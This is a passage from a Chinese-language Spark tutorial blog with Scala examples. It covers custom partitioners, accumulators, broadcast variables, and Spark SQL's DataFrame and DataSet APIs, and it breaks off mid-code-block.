中完成计算，不划分(将窄依赖尽量放在在同一个 stage 中，可以实现流水线计算)。对于宽依赖，由于有 shuffle 的存在，只能在父 RDD 处理完成后，才能开始接下来的计算，也就是说需要要划分 stage</p><p>**总结：**Spark 会根据 shuffle/宽依赖使用回溯算法来对 DAG 进行 Stage 划分，从后往前，遇到宽依赖就断开，遇到窄依赖就把当前的 RDD 加入到当前的 stage/阶段中</p><h3 id="4-4-RDD-分区器">4.4 RDD 分区器</h3><p>Spark 目前支持 Hash 分区和 Range 分区，和用户自定义分区。<strong>Hash 分区为当前的默认分区</strong>。分区器直接决定了 RDD 中分区的个数、RDD 中每条数据经过 Shuffle 后进入哪个分区，进而决定了 Reduce 的个数。</p><ul><li>Hash 分区：对于给定的 key，计算其 hashCode,并除以分区个数取余</li><li>Range 分区：将一定范围内的数据映射到一个分区中，尽量保证每个分区数据均匀，而且分区间有序</li></ul><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义分区</span></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Spark01_RDD_Part</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> sparConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local"</span>).setAppName(<span class="string">"WordCount"</span>)</span><br><span class="line">        <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(sparConf)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(</span><br><span class="line">            (<span class="string">"nba"</span>, <span class="string">"xxxxxxxxx"</span>),</span><br><span class="line">            (<span class="string">"cba"</span>, <span class="string">"xxxxxxxxx"</span>),</span><br><span class="line">            (<span class="string">"wnba"</span>, <span class="string">"xxxxxxxxx"</span>),</span><br><span class="line">            (<span class="string">"nba"</span>, <span class="string">"xxxxxxxxx"</span>),</span><br><span class="line">        ),<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">val</span> partRDD: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">String</span>)] = rdd.partitionBy( <span class="keyword">new</span> <span class="type">MyPartitioner</span> )</span><br><span class="line"></span><br><span class="line">        partRDD.saveAsTextFile(<span class="string">"output"</span>)</span><br><span class="line"></span><br><span class="line">        sc.stop()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 自定义分区器</span></span><br><span class="line"><span class="comment">      * 1. 继承Partitioner</span></span><br><span class="line"><span class="comment">      * 2. 重写方法</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyPartitioner</span> <span class="keyword">extends</span> <span class="title">Partitioner</span></span>&#123;</span><br><span class="line">        <span class="comment">// 分区数量</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">numPartitions</span></span>: <span class="type">Int</span> = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据数据的key值返回数据所在的分区索引（从0开始）</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">getPartition</span></span>(key: <span class="type">Any</span>): <span class="type">Int</span> = &#123;</span><br><span class="line">            key <span class="keyword">match</span> &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">"nba"</span> =&gt; <span class="number">0</span></span><br><span class="line">                <span class="keyword">case</span> <span class="string">"wnba"</span> =&gt; <span class="number">1</span></span><br><span class="line">                <span class="keyword">case</span> _ =&gt; <span class="number">2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5、RDD累加器">5、RDD累加器</h2><blockquote><p>累加器用来把 Executor 端变量信息聚合到 Driver 端。在 Driver 程序中定义的变量，在Executor 端的每个 Task 都会得到这个变量的一份新的副本，每个 task 更新这些副本的值后，传回 Driver 端进行 merge</p></blockquote><p>系统累加器</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 系统累加器,不用累加器会发现连累加都无法正常使用</span></span><br><span class="line"><span class="comment">// 获取系统累加器</span></span><br><span class="line"><span class="comment">// Spark默认就提供了简单数据聚合的累加器</span></span><br><span class="line"><span class="keyword">val</span> sumAcc = sc.longAccumulator(<span class="string">"sum"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//sc.doubleAccumulator</span></span><br><span class="line"><span class="comment">//sc.collectionAccumulator</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> mapRDD = rdd.map(</span><br><span class="line">    num =&gt; &#123;</span><br><span class="line">        <span class="comment">// 使用累加器</span></span><br><span class="line">        sumAcc.add(num)</span><br><span class="line">        num</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取累加器的值</span></span><br><span class="line"><span class="comment">// 少加：转换算子中调用累加器，如果没有行动算子的话，那么不会执行</span></span><br><span class="line"><span class="comment">// 多加：转换算子中调用累加器，如果没有行动算子的话，那么不会执行</span></span><br><span class="line"><span class="comment">// 一般情况下，累加器会放置在行动算子进行操作</span></span><br><span class="line">mapRDD.collect()</span><br><span class="line">mapRDD.collect()</span><br><span class="line">println(sumAcc.value)</span><br><span class="line">sc.stop()</span><br></pre></td></tr></table></figure><p>自定义累加器</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Spark04_Acc_WordCount</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> sparConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local"</span>).setAppName(<span class="string">"Acc"</span>)</span><br><span class="line">        <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(sparConf)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(<span class="string">"hello"</span>, <span class="string">"spark"</span>, <span class="string">"hello"</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 累加器 : WordCount</span></span><br><span class="line">        <span class="comment">// 创建累加器对象</span></span><br><span class="line">        <span class="keyword">val</span> wcAcc = <span class="keyword">new</span> <span class="type">MyAccumulator</span>()</span><br><span class="line">        <span class="comment">// 向Spark进行注册</span></span><br><span class="line">        sc.register(wcAcc, <span class="string">"wordCountAcc"</span>)</span><br><span class="line"></span><br><span class="line">        rdd.foreach(</span><br><span class="line">            word =&gt; &#123;</span><br><span class="line">                <span class="comment">// 数据的累加（使用累加器）</span></span><br><span class="line">                wcAcc.add(word)</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取累加器累加的结果</span></span><br><span class="line">        println(wcAcc.value)</span><br><span class="line"></span><br><span class="line">        sc.stop()</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      自定义数据累加器：WordCount</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      1. 继承AccumulatorV2, 定义泛型</span></span><br><span class="line"><span class="comment">         IN : 累加器输入的数据类型 String</span></span><br><span class="line"><span class="comment">         OUT : 累加器返回的数据类型 mutable.Map[String, Long]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      2. 重写方法（6）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyAccumulator</span> <span class="keyword">extends</span> <span class="title">AccumulatorV2</span>[<span class="type">String</span>, mutable.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>]] </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">var</span> wcMap = mutable.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>]()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断是否初始状态</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">isZero</span></span>: <span class="type">Boolean</span> = &#123;</span><br><span class="line">            wcMap.isEmpty</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">copy</span></span>(): <span class="type">AccumulatorV2</span>[<span class="type">String</span>, mutable.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>]] = &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="type">MyAccumulator</span>()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">reset</span></span>(): <span class="type">Unit</span> = &#123;</span><br><span class="line">            wcMap.clear()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取累加器需要计算的值</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">add</span></span>(word: <span class="type">String</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">            <span class="keyword">val</span> newCnt = wcMap.getOrElse(word, <span class="number">0</span>L) + <span class="number">1</span></span><br><span class="line">            wcMap.update(word, newCnt)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Driver合并多个累加器</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">merge</span></span>(other: <span class="type">AccumulatorV2</span>[<span class="type">String</span>, mutable.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>]]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">val</span> map1 = <span class="keyword">this</span>.wcMap</span><br><span class="line">            <span class="keyword">val</span> map2 = other.value</span><br><span class="line"></span><br><span class="line">            map2.foreach&#123;</span><br><span class="line">                <span class="keyword">case</span> ( word, count ) =&gt; &#123;</span><br><span class="line">                    <span class="keyword">val</span> newCount = map1.getOrElse(word, <span class="number">0</span>L) + count</span><br><span class="line">                    map1.update(word, newCount)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 累加器结果</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">value</span></span>: mutable.<span class="type">Map</span>[<span class="type">String</span>, <span class="type">Long</span>] = &#123;</span><br><span class="line">            wcMap</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6、RDD广播变量">6、RDD广播变量</h2><p>广播变量用来高效分发较大的对象。向所有工作节点发送一个较大的只读值，以供一个或多个 Spark 操作使用。比如，如果你的应用需要向所有节点发送一个较大的只读查询表，广播变量用起来都很顺手。在多个并行操作中使用同一个变量，但是 Spark 会为每个任务分别发送</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">BroadcastVariablesTest</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> conf: <span class="type">SparkConf</span> = <span class="keyword">new</span> <span class="type">SparkConf</span>().setAppName(<span class="string">"wc"</span>).setMaster(<span class="string">"local[*]"</span>)</span><br><span class="line">    <span class="keyword">val</span> sc: <span class="type">SparkContext</span> = <span class="keyword">new</span> <span class="type">SparkContext</span>(conf)</span><br><span class="line">    sc.setLogLevel(<span class="string">"WARN"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//不使用广播变量</span></span><br><span class="line">    <span class="keyword">val</span> kvFruit: <span class="type">RDD</span>[(<span class="type">Int</span>, <span class="type">String</span>)] = sc.parallelize(<span class="type">List</span>((<span class="number">1</span>,<span class="string">"apple"</span>),(<span class="number">2</span>,<span class="string">"orange"</span>),(<span class="number">3</span>,<span class="string">"banana"</span>),(<span class="number">4</span>,<span class="string">"grape"</span>)))</span><br><span class="line">    <span class="keyword">val</span> fruitMap: collection.<span class="type">Map</span>[<span class="type">Int</span>, <span class="type">String</span>] =kvFruit.collectAsMap</span><br><span class="line">    <span class="comment">//scala.collection.Map[Int,String] = Map(2 -&gt; orange, 4 -&gt; grape, 1 -&gt; apple, 3 -&gt; banana)</span></span><br><span class="line">    <span class="keyword">val</span> fruitIds: <span class="type">RDD</span>[<span class="type">Int</span>] = sc.parallelize(<span class="type">List</span>(<span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>))</span><br><span class="line">    <span class="comment">//根据水果编号取水果名称</span></span><br><span class="line">    <span class="keyword">val</span> fruitNames: <span class="type">RDD</span>[<span class="type">String</span>] = fruitIds.map(x=&gt;fruitMap(x))</span><br><span class="line">    fruitNames.foreach(println)</span><br><span class="line">    <span class="comment">//注意:以上代码看似一点问题没有,但是考虑到数据量如果较大,且Task数较多,</span></span><br><span class="line">    <span class="comment">//那么会导致,被各个Task共用到的fruitMap会被多次传输</span></span><br><span class="line">    <span class="comment">//应该要减少fruitMap的传输,一台机器上一个,被该台机器中的Task共用即可</span></span><br><span class="line">    <span class="comment">//如何做到?---使用广播变量</span></span><br><span class="line">    <span class="comment">//注意:广播变量的值不能被修改,如需修改可以将数据存到外部数据源,如MySQL、Redis</span></span><br><span class="line">    println(<span class="string">"====================="</span>)</span><br><span class="line">    <span class="keyword">val</span> <span class="type">BroadcastFruitMap</span>: <span class="type">Broadcast</span>[collection.<span class="type">Map</span>[<span class="type">Int</span>, <span class="type">String</span>]] = sc.broadcast(fruitMap)</span><br><span class="line">    <span class="keyword">val</span> fruitNames2: <span class="type">RDD</span>[<span class="type">String</span>] = fruitIds.map(x=&gt;<span class="type">BroadcastFruitMap</span>.value(x))</span><br><span class="line">    fruitNames2.foreach(println)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>三、Spark SQL</h1><h2 id="1、SparkSQL-概述">1、SparkSQL 概述</h2><blockquote><p>Spark SQL 是Spark 用于结构化数据(structured data)处理的 Spark 模块</p></blockquote><h3 id="1-1-SparkSQL的发展">1.1 SparkSQL的发展</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291816205.jpg" alt></p><ul><li><p><strong>Hive</strong></p><p>Hive 实现了 SQL on Hadoop，使用 MapReduce 执行任务 简化了 MapReduce 任务。但Hive 的查询延迟比较高，原因是使用 MapReduce 做计算。</p></li><li><p><strong>Shark</strong></p><p>Shark 改写 Hive 的物理执行计划， 使用 Spark 代替 MapReduce 物理引擎 使用列式内存存储。以上两点使得 Shark 的查询效率很高。但是Shark 执行计划的生成严重依赖 Hive，想要增加新的优化非常困难；Hive 是进程级别的并行，Spark 是线程级别的并行，所以 Hive 中很多线程不安全的代码不适用于 Spark；由于以上问题，Shark 维护了 Hive 的一个分支，并且无法合并进主线，难以为继；在 2014 年 7 月 1 日的 Spark Summit 上，Databricks 宣布终止对 Shark 的开发，将重点放到 Spark SQL 上，但也因此发展出两个支线：SparkSQL 和 Hive on Spark</p><p>其中 SparkSQL 作为 Spark 生态的一员继续发展，而不再受限于 Hive，只是兼容 Hive；而Hive on Spark 是一个Hive 的发展计划，该计划将 Spark 作为Hive 的底层引擎之一，也就是说，Hive 将不再受限于一个引擎，可以采用 Map-Reduce、Tez、Spark 等引擎</p></li><li><p><strong>SparkSQL-DataFrame</strong></p><p>Spark SQL 执行计划和优化交给优化器 Catalyst；内建了一套简单的 SQL 解析器，可以不使用 HQL；还引入和 DataFrame 这样的 DSL API，完全可以不依赖任何 Hive 的组件。但是对于初期版本的 SparkSQL，依然有挺多问题，例如只能支持 SQL 的使用，不能很好的兼容命令式，入口不够统一等。</p></li><li><p><strong>SparkSQL-Dataset</strong></p><p>SparkSQL 在 1.6 时代，增加了一个新的 API，叫做 Dataset，Dataset 统一和结合了 SQL 的访问和命令式 API 的使用，这是一个划时代的进步。在 Dataset 中可以轻易的做到使用 SQL 查询并且筛选数据，然后使用命令式 API 进行探索式分析</p></li></ul><h3 id="1-2-Hive-and-SparkSQL">1.2 Hive and SparkSQL</h3><ul><li>Hive 是将 SQL 转为 MapReduce。</li><li>SparkSQL 可以理解成是将 SQL 解析成：“RDD + 优化” 再执行</li></ul><h3 id="1-3-SparkSQL-特点">1.3 SparkSQL 特点</h3><ul><li>易整合，无缝的整合了 SQL 查询和 Spark 编程</li><li>统一的数据访问，使用相同的方式连接不同的数据源</li><li>兼容 Hive，在已有的仓库上直接运行 SQL 或者 HiveQL</li><li>标准数据连接，通过 JDBC 或者 ODBC 来连接</li></ul><h3 id="1-4-DataFrame简介">1.4 DataFrame简介</h3><p>在 Spark 中，DataFrame 是一种以 RDD 为基础的分布式数据集，类似于传统数据库中的二维表格。<strong>DataFrame 与 RDD 的主要区别在于，前者带有 schema 元信息，即 DataFrame 所表示的二维表数据集的每一列都带有名称和类型</strong>。这使得 Spark SQL 得以洞察更多的结构信息，从而对藏于 DataFrame 背后的数据源以及作用于 DataFrame 之上的变换进行了针对性的优化，最终达到大幅提升运行时效率的目标。反观 RDD，由于无从得知所存数据元素的具体内部结构，Spark Core 只能在 stage 层面进行简单、通用的流水线优化。</p><p>DataFrame 的前身是 SchemaRDD，从 Spark 1.3.0 开始 SchemaRDD 更名为 DataFrame，并不再直接继承自 RDD，而是自己实现了 RDD 的绝大多数功能。同时，与Hive 类似，DataFrame 也支持嵌套数据类型（struct、array 和 map）。从 API 易用性的角度上看，DataFrame API 提供的是一套高层的关系操作，比函数式的 RDD API 要更加友好，门槛更低</p><p><strong>总结：DataFrame 就是一个分布式的表</strong>；<strong>DataFrame = RDD - 泛型 + SQL 的操作 + 优化</strong></p><h3 id="1-5-DataSet">1.5 DataSet</h3><p>DataSet 是分布式数据集合。DataSet 是Spark 1.6 中添加的一个新抽象，是DataFrame的一个扩展。它提供了RDD 的优势（强类型，使用强大的 lambda 函数的能力）以及SparkSQL 优化执行引擎的优点。DataSet 也可以使用功能性的转换（操作 map，flatMap，filter等等）</p><ul><li>DataSet 是DataFrame API 的一个扩展，是SparkSQL 最新的数据抽象</li><li>用户友好的 API 风格，既具有类型安全检查也具有DataFrame 的查询优化特性；</li><li>用样例类来对DataSet 中定义数据的结构信息，样例类中每个属性的名称直接映射到DataSet 中的字段名称；</li><li>DataSet 是强类型的。比如可以有 DataSet[Car]，DataSet[Person]</li><li>DataFrame 是DataSet 的特列，DataFrame=DataSet[Row] ，所以可以通过 as 方法将DataFrame 转换为DataSet。Row 是一个类型，跟 Car、Person 这些的类型一样，所有的表结构信息都用 Row 来表示。获取数据时需要指定顺序</li></ul><h3 id="1-6-RDD、DataFrame、DataSet-的区别">1.6 RDD、DataFrame、DataSet 的区别</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291816206.jpg" alt></p><ul><li>RDD[Person]：以 Person 为类型参数，但不了解 其内部结构</li><li>DataFrame：提供了详细的结构信息 schema 列的名称和类型。这样看起来就像一张表了</li><li>DataSet[Person]：不光有 schema 信息，还有类型信息</li></ul><p><strong>总结</strong></p><ul><li><strong>DataFrame = RDD - 泛型 + Schema + SQL + 优化</strong></li><li><strong>DataSet = DataFrame + 泛型</strong></li><li><strong>DataSet = RDD + Schema + SQL + 优化</strong></li></ul><h2 id="2、SparkSQL-核心编程">2、SparkSQL 核心编程</h2><h3 id="2-1-概述-v2">2.1 概述</h3><ul><li><p>在 spark2.0 版本之前</p><p>SQLContext 是创建 DataFrame 和执行 SQL 的入口。HiveContext 通过 hive sql 语句操作 hive 表数据，兼容 hive 操作，hiveContext 继承自 SQLContext。</p></li><li><p>在 spark2.0 之后</p><p>这些都统一于 SparkSession，SparkSession 封装了 SqlContext 及 HiveContext；实现了 SQLContext 及 HiveContext 所有功能；通过 SparkSession 还可以获取到 SparkConetxt</p></li></ul><h3 id="2-2-创建-DataFrame-DataSet">2.2 创建 DataFrame/DataSet</h3><p><strong>读取文本文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =====读取文本文件</span></span><br><span class="line"><span class="comment"># 在本地创建一个文件，有 id、name、age 三列，用空格分隔，然后上传到 hdfs 上</span></span><br><span class="line">vim /root/person.txt</span><br><span class="line">1 zhangsan 20</span><br><span class="line">2 lisi 29</span><br><span class="line">3 wangwu 25</span><br><span class="line">4 zhaoliu 30</span><br><span class="line">5 tianqi 35</span><br><span class="line">6 kobe 40</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开 spark-shell</span></span><br><span class="line"><span class="comment"># 创建 RDD</span></span><br><span class="line">spark/bin/spark-shell</span><br><span class="line"><span class="comment"># RDD[Array[String]]</span></span><br><span class="line">val lineRDD= sc.textFile(<span class="string">"hdfs://node1:8020/person.txt"</span>).map(_.split(<span class="string">" "</span>)) </span><br><span class="line"><span class="comment"># 定义 case class(相当于表的 schema)</span></span><br><span class="line"><span class="keyword">case</span> class Person(id:Int, name:String, age:Int)</span><br><span class="line"><span class="comment"># 将 RDD 和 case class 关联</span></span><br><span class="line"><span class="comment"># RDD[Person]</span></span><br><span class="line">val personRDD = lineRDD.map(x =&gt; Person(x(0).toInt, x(1), x(2).toInt))</span><br><span class="line"><span class="comment"># 将 RDD 转换成 DataFrame</span></span><br><span class="line"><span class="comment"># DataFrame</span></span><br><span class="line">val personDF = personRDD.toDF</span><br><span class="line"><span class="comment"># 查看数据和 schema</span></span><br><span class="line">personDF.show</span><br><span class="line">personDF.printSchema</span><br><span class="line"><span class="comment"># 注册表</span></span><br><span class="line">personDF.createOrReplaceTempView(<span class="string">"t_person"</span>)</span><br><span class="line"><span class="comment"># 执行 SQL</span></span><br><span class="line">spark.sql(<span class="string">"select id,name from t_person where id &gt; 3"</span>).show</span><br><span class="line"><span class="comment"># 也可以通过 SparkSession 构建 DataFrame</span></span><br><span class="line">val dataFrame=spark.read.text(<span class="string">"hdfs://node1:8020/person.txt"</span>)</span><br><span class="line"><span class="comment">#注意：直接读取的文本文件没有完整schema信息</span></span><br><span class="line">dataFrame.show</span><br><span class="line">dataFrame.printSchema</span><br></pre></td></tr></table></figure><p><strong>读取 json 文件</strong>和<strong>读取 parquet 文件</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">val jsonDF= spark.read.json(<span class="string">"file:///resources/people.json"</span>)</span><br><span class="line"><span class="comment"># 接下来就可以使用 DataFrame 的函数操作</span></span><br><span class="line">jsonDF.show</span><br><span class="line"><span class="comment"># 注意：直接读取 json 文件有 schema 信息，因为 json 文件本身含有 Schema 信息，SparkSQL 可以自动解析</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 parquet 文件</span></span><br><span class="line">val parquetDF=spark.read.parquet(<span class="string">"file:///resources/users.parquet"</span>)</span><br><span class="line">parquetDF.show</span><br><span class="line"><span class="comment"># 注意：直接读取 parquet 文件有 schema 信息，因为 parquet 文件中保存了列的信息</span></span><br></pre></td></tr></table></figure><h3 id="2-3-两种查询风格：DSL-和-SQL">2.3 两种查询风格：DSL 和 SQL</h3><p>首先进行准备工作,先读取文件并转换为 DataFrame 或 DataSet</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">val lineRDD= sc.textFile("hdfs://node1:8020/person.txt").map(_.split(" "))</span><br><span class="line">case class Person(id:Int, name:String, age:Int)</span><br><span class="line">val personRDD = lineRDD.map(x =&gt; Person(x(0).toInt, x(1), x(2).toInt))</span><br><span class="line">val personDF = personRDD.toDF</span><br><span class="line">personDF.show</span><br><span class="line">//val personDS = personRDD.toDS</span><br><span class="line">//personDS.show</span><br></pre></td></tr></table></figure><p><strong>DSL 风格</strong>:SparkSQL 提供了一个领域特定语言(DSL)以方便操作结构化数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 